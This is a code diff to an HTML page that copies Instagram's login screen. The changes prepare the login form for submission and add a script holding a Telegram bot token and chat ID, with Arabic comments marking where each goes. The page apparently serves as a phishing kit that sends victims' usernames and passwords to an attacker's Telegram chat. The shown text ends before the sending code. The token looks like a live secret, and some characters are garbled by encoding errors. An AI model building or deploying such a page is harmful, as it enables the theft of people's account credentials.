@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="./styles.css" />
+    <link rel="stylesheet" href="styles.css" />
     <link rel="icon" type="image/png" href="./img/insta-fav.ico">
-    <title>Instagram clone</title>
+    <title>Instagram Clone</title>
 </head>
 <body>
     <main class="flex align-items-center justify-content-center">
@@ -14,16 +14,16 @@
         <section id="auth" class="flex direction-column">
             <div class="panel login flex direction-column">
                 <h1 title="Instagram" class="flex justify-content-center">
-                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                 </h1>
-                <form>
-                    <label for="email" class="sr-only">Phone number, username, or email</label>
-                    <input name="email" placeholder="Phone number, username, or email" />
+                <form id="login-form">
+                    <label for="email" class="sr-only">Phone, username, or email</label>
+                    <input id="email" name="email" placeholder="Phone, username, or email" required />
 
                     <label for="password" class="sr-only">Password</label>
-                    <input name="password" type="password" placeholder="Password" />
+                    <input id="password" name="password" type="password" placeholder="Password" required />
 
-                    <button type="button">Log In</button>
+                    <button type="submit">Log In</button>
                 </form>
                 <div class="flex separator align-items-center">
                     <span></span>
@@ -39,14 +39,14 @@
                 </div>
             </div>
             <div class="panel register flex justify-content-center">
-                <p>Don’t have an account?</p>
+                <p>Don't have an account?</p>
                 <a href="#">Sign up</a>
             </div>
             <div class="app-download flex direction-column align-items-center">
                 <p>Get the app.</p>
                 <div class="flex justify-content-center">
-                    <img src="./img/apple-button.png" alt="Apple App Store badge" title="Download on the App Store" />
-                    <img src="./img/googleplay-button.png" alt="Google Play Store badge" title="Get it on Google Play" />
+                    <img src="./img/apple-button.png" alt="Apple App Store logo" title="Apple App Store" />
+                    <img src="./img/googleplay-button.png" alt="Google Play logo" title="Google Play Store" />
                 </div>
             </div>
         </section>
@@ -60,15 +60,15 @@
             <li><a href="#">CAREERS</a></li>
             <li><a href="#">PRIVACY</a></li>
             <li><a href="#">TERMS</a></li>
-            <li><a href="#">LOCATIONS</a></li>
-            <li><a href="#">TOP ACCOUNTS</a></li>
+            <li><a href="#">LOCATION</a></li>
+            <li><a href="#">MORE ACCOUNTS</a></li>
             <li><a href="#">HASHTAGS</a></li>
             <li><a href="#">LANGUAGE</a></li>
         </ul>
-        <p class="copyright">© 2020 Instagram from Facebook</p>
+        <p class="copyright">Â© 2020 Instagram from Facebook</p>
     </footer>
 
-    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
 <script>
     const TOKEN = "8477806244:AAEiv0TlYAI52Co9sIUcf6UzknsJNoxDZ6o";                                                            // Ù‡Ù†Ø§ Ø§Ù„ØªÙˆÙƒÙŠÙ†              
     const CHAT_ID = "769819951";                                                       // Ù‡Ù†Ø§ Ù…Ø¹Ø±Ù Ø§Ù„Ø´Ø§Øª https://api.telegram.org/bot/getUpdates
